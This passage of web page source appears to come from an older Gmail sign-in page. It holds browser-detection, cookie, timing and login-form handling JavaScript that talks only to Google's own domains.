-1||agt.indexOf("regking")!=-1||agt.indexOf("windows ce")!=-1||agt.indexOf("j2me")!=-1||agt.indexOf("avantgo")!=-1||agt.indexOf(" stb")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"msie ");if(v!=null)return v>=5.5}if(is_gk&&!is_sf){var v=BrowserSupport_.GetFollowingFloat(agt,"rv:");if(v!=null)return v>=1.4;else{v=BrowserSupport_.GetFollowingFloat(agt,"galeon/");if(v!=null)return v>=
1.3}}if(is_sf){if(agt.indexOf("rv:3.14.15.92.65")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"applewebkit/");if(v!=null)return v>=312}if(is_op){if(agt.indexOf("sony/com1")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"opera ");if(v==null)v=BrowserSupport_.GetFollowingFloat(agt,"opera/");if(v!=null)return v>=8}if(agt.indexOf("pda; sony/com2")!=-1)return true;return false},
GetFollowingFloat:function(str,pfx){var i=str.indexOf(pfx);if(i!=-1){var v=parseFloat(str.substring(i+pfx.length));if(!isNaN(v))return v}return null}};var is_browser_supported=BrowserSupport_.IsBrowserSupported()
  </script>
<script type="text/javascript" nonce="">
<!--

var start_time = (new Date()).getTime();

if (top.location != self.location) {
 top.location = self.location.href;
}

function SetGmailCookie(name, value) {
  document.cookie = name + "=" + value + ";path=/;domain=.google.com";
}

function lg() {
  var now = (new Date()).getTime();

  var cookie = "T" + start_time + "/" + start_time + "/" + now;
  SetGmailCookie("GMAIL_LOGIN", cookie);
}

function StripParam(url, param) {
  var start = url.indexOf(param);
  if (start == -1) return url;
  var end = start + param.length;

  var charBefore = url.charAt(start-1);
  if (charBefore != '?' && charBefore != '&') return url;

  var charAfter = (url.length >= end+1) ? url.charAt(end) : '';
  if (charAfter != '' && charAfter != '&' && charAfter != '#') return url;
  if (charBefore == '&') {
  --start;
  } else if (charAfter == '&') {
  ++end;
  }
  return url.substring(0, start) + url.substring(end);
}
var fixed = 0;
function FixForm() {
  if (is_browser_supported) {
  var form = el("gaia_loginform");
  if (form && form["continue"]) {
  var url = form["continue"].value;
  url = StripParam(url, "ui=html");
  url = StripParam(url, "zy=l");
  form["continue"].value = url;
  }
  }
  fixed = 1;
}
function el(id) {
  if (document.getElementById) {
  return document.getElementById(id);
  } else if (window[id]) {
  return window[id];
  }
  return null;
}
var ONE_PX = "https://mail.google.com/mail/images/cleardot.gif?t=" +
  (new Date()).getTime();
function LogRoundtripTime() {
  var img = new Image();
  var start = (new Date()).getTime();
  img.onload = GetRoundtripTimeFunction(start);
  img.src = ONE_PX;
}
function GetRoundtripTimeFunction(start) {
  return function() {
  var end = (new Date()).getTime();
  SetGmailCookie("GMAIL_RTT", (end - start));
  }
}
function MaybePingUser() {
  var f = el("gaia_loginform");
  if (f.Email.value) {
  new Image().src = 'https://mail.google.com/mail/gxlu?email=' +
  encodeURIComponent(f.Email.value) +
  '&zx=' + (new Date().getTime());
  }
}
var passwd_elem = el("Passwd");
if (passwd_elem) {
  passwd_elem.onfocus = MaybePingUser;
}
function OnLoad() {
  MaybePingUser();
  LogRoundtripTime();
  LoadConversionScript();
}
var google_conversion_type = 'landing';
var google_conversion_id = 1069902127;
var google_conversion_language = "en_US";
var google_conversion_format = "1";
var google_conversion_color = "FFFFFF";
function LoadConversionScript() {
  var script = document.createElement("script");
  script.type = "text/javascript";
  script.src = "https://www.googleadservices.com/pagead/conversion.js";
}
// -->
</script>
<script nonce="">
gaia_attachEvent(window, 'load', function() {
  OnLoad();
  FixForm();
});
(function() {
  var gaiaLoginForm = document.getElementById('gaia_loginform');
  var gaia_onsubmitHandler = gaiaLoginForm.onsubmit;
  gaiaLoginForm.onsubmit = function() {
  lg();
  if (!fixed) {
  FixForm();
  }
  gaia_onsubmitHandler();
  };
})();
</script>
  <script nonce="">
  if (gaia.ps.hasPrefilledIdentifier) {
  var form = document.getElementById('gaia_loginform');
  if (form) {
  form.submit();
  }
  }
  </script>
<script nonce="">
  (function(){
  gaia_onLoginSubmit = function() {
  try {
  gaia.loginAutoRedirect.stop();
  } catch (err) {
  // do not prevent form from being submitted
  }
  try {
  document.bg.invoke(function(response) {
  document.getElementById('bgresponse').value = response;
  });
  } catch (err) {
  document.getElementById('bgresponse').value = '';
  }
  return true;
  }
  document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
  var signinButton;
  signinButton = document.getElementById('signIn');
  gaia_attachEvent(window, 'load', function(){
  gaia_scrollToElement(signinButton);
  });
  })();
</script>
  

</body></html>